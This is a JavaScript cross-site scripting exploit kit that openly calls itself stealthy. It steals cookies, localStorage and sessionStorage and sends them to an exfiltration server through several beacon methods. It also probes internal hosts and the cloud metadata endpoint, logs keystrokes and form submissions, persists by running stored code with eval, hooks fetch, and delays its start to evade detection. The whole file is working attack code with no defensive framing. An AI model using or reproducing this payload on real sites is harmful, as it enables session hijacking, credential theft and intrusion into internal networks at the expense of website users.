// Advanced XSS Exploitation Kit
// Designed to be stealthy while exfiltrating maximum data

// Configuration
const config = {
  exfilServer: "https://your-collab-id.burpcollaborator.net",
  beaconInterval: 5000,
  scanInternal: true,
  keylogger: true
};

// Stealthy beacon function
function beacon(data) {
  // Use multiple exfiltration methods
  const methods = [
    () => fetch(`${config.exfilServer}/exfil?${Date.now()}=${btoa(JSON.stringify(data))}`),
    () => new Image().src = `${config.exfilServer}/img?${Date.now()}=${encodeURIComponent(JSON.stringify(data))}`,
    () => navigator.sendBeacon(`${config.exfilServer}/beacon`, JSON.stringify(data))
  ];
  
  // Try each method until one works
  methods.some(method => {
    try {
      method();
      return true;
    } catch (e) {
      return false;
    }
  });
}

// Main data collection function
function collectData() {
  const data = {
    url: window.location.href,
    domain: document.domain,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    screen: `${screen.width}x${screen.height}`,
    plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    languages: navigator.languages.join(','),
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory
  };

  // Try to access more sensitive data
  try {
    data.webRTC = JSON.stringify(rtcPeerConnection.getConfiguration());
  } catch (e) {}
  
  try {
    data.battery = navigator.getBattery().then(b => JSON.stringify(b));
  } catch (e) {}
  
  beacon(data);
}

// Internal network scanner
function scanInternal() {
  if (!config.scanInternal) return;
  
  const targets = [
    "http://localhost",
    "http://127.0.0.1",
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://internal",
    "http://api.internal",
    "http://db.internal",
    "http://jenkins.internal",
    "http://gitlab.internal",
    "http://169.254.169.254/latest/meta-data/"
  ];
  
  targets.forEach(target => {
    fetch(target, { mode: 'no-cors' })
      .then(res => res.text())
      .then(text => beacon({ internal: target, data: btoa(text) }))
      .catch(e => {});
  });
}

// Keylogger
function setupKeylogger() {
  if (!config.keylogger) return;
  
  let keystrokes = '';
  
  document.addEventListener('keydown', (e) => {
    keystrokes += e.key;
    if (keystrokes.length > 50) {
      beacon({ keystrokes });
      keystrokes = '';
    }
  });
  
  // Also capture form submissions
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', () => {
      const inputs = Array.from(form.elements)
        .filter(el => el.name)
        .map(el => `${el.name}=${el.value}`);
      beacon({ formSubmission: inputs.join('&') });
    });
  });
}

// DOM Clobbering for persistence
function setupPersistence() {
  if (window.name.includes('xss-persist')) {
    localStorage.setItem('xss-payload', window.name.split('=')[1]);
  }
  
  if (localStorage.getItem('xss-payload')) {
    eval(localStorage.getItem('xss-payload'));
  }
}

// Initial execution
(function main() {
  // Delay execution to avoid detection
  setTimeout(() => {
    collectData();
    scanInternal();
    setupKeylogger();
    setupPersistence();
    
    // Set up periodic beacon
    setInterval(collectData, config.beaconInterval);
    
    // Hook all fetch requests
    const originalFetch = window.fetch;
    window.fetch = function() {
      return originalFetch.apply(this, arguments)
        .then(res => {
          beacon({ fetch: arguments[0], status: res.status });
          return res;
        });
    };
  }, 2000);
})();
